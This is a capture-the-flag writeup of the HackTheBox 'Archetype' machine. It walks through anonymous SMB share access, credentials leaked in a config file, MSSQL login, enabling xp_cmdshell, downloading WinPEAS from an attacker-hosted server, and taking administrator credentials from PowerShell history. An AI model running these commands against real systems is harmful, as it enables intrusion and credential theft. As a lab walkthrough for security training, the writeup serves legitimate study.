# Archetype — HackTheBox Writeup

## Overview

* Target: Archetype
* Platform: HackTheBox
* Difficulty: Easy
* OS: Windows Server 2019
* Techniques: SMB enumeration, credential discovery, MSSQL exploitation, PowerShell history credential leakage

---

# Reconnaissance

## Nmap Scan

Initial full port scan:

```
Nmap scan - nmap -A -sV -T5 -p- <IP>
```

Important results:

```
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
445/tcp   open  microsoft-ds Windows Server 2019
1433/tcp  open  ms-sql-s Microsoft SQL Server 2017
5985/tcp  open  http
47001/tcp open  http
```

The machine appears to be a **Windows Server 2019 system** with several Windows services exposed. The most interesting services were **SMB (445)** and **MSSQL (1433)**.

Since SMB shares often contain sensitive files, enumeration began with SMB.

---

# Enumeration

## SMB Enumeration

To list available shares:

```
smbclient -N -L //<IP>
```

Result:

```
ADMIN$
backups
C$
IPC$
```

The **backups** share allowed anonymous access.

Connecting to the share:

```
smbclient -N //<IP>/backups
```

Inside the share, a configuration file named **prod.dtsConfig** was discovered.

---

# Credential Discovery

After downloading and inspecting the file, the following credentials were discovered:

```
Data Source=.;
Password=M3g4c0rp123;
User ID=ARCHETYPE\sql_svc;
Initial Catalog=Catalog;
```

These credentials appeared to belong to the **SQL Server service account**.

---

# Initial Access

Using the discovered credentials, a connection to the MSSQL server was established using **impacket's mssqlclient**.

```
mssqlclient.py ARCHETYPE/sql_svc@<IP>
```

Once authenticated, commands could be executed through SQL Server using **xp_cmdshell**. This feature needed to be enabled first.

Enable xp_cmdshell:

```
EXEC sp_configure 'show advanced options', 1;
RECONFIGURE;
EXEC sp_configure 'xp_cmdshell', 1;
RECONFIGURE;
```

This allows execution of system commands directly from the SQL server context.

---

# Post-Exploitation

To enumerate the system for privilege escalation opportunities, **WinPEAS** was uploaded.

First, a web server was started on the attack machine:

```
python3 -m http.server
```

Then the file was downloaded on the target system using PowerShell:

```
EXEC xp_cmdshell 'powershell -c "iwr -uri http://<attacker-ip>/winpeas.exe -outfile C:/Users/sql_svc/winpeas.exe"';
```

The tool was executed:

```
C:\Users\sql_svc\winpeas.exe
```

WinPEAS revealed a **PowerShell command history file**.

```
C:\Users\sql_svc\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
```

---

# Credential Reuse

Reading the PowerShell history file revealed previously executed commands:

```
net.exe use T: \\Archetype\backups /user:administrator MEGACORP_4dm1n!!
```

This exposed **administrator credentials**.

---

# Privilege Escalation

Using the discovered administrator credentials allowed access to administrative resources on the system.

User flag location:

```
C:\Users\sql_svc\Desktop\user.txt
```

Root flag location:

```
C:\Users\Administrator\Desktop\root.txt
```

---

# Lessons Learned

* SMB shares can expose sensitive configuration files.
* Configuration files may contain **hardcoded credentials**.
* MSSQL servers can allow command execution through **xp_cmdshell**.
* PowerShell history files can leak sensitive credentials.
* Enumeration tools such as **WinPEAS** help identify privilege escalation opportunities quickly.
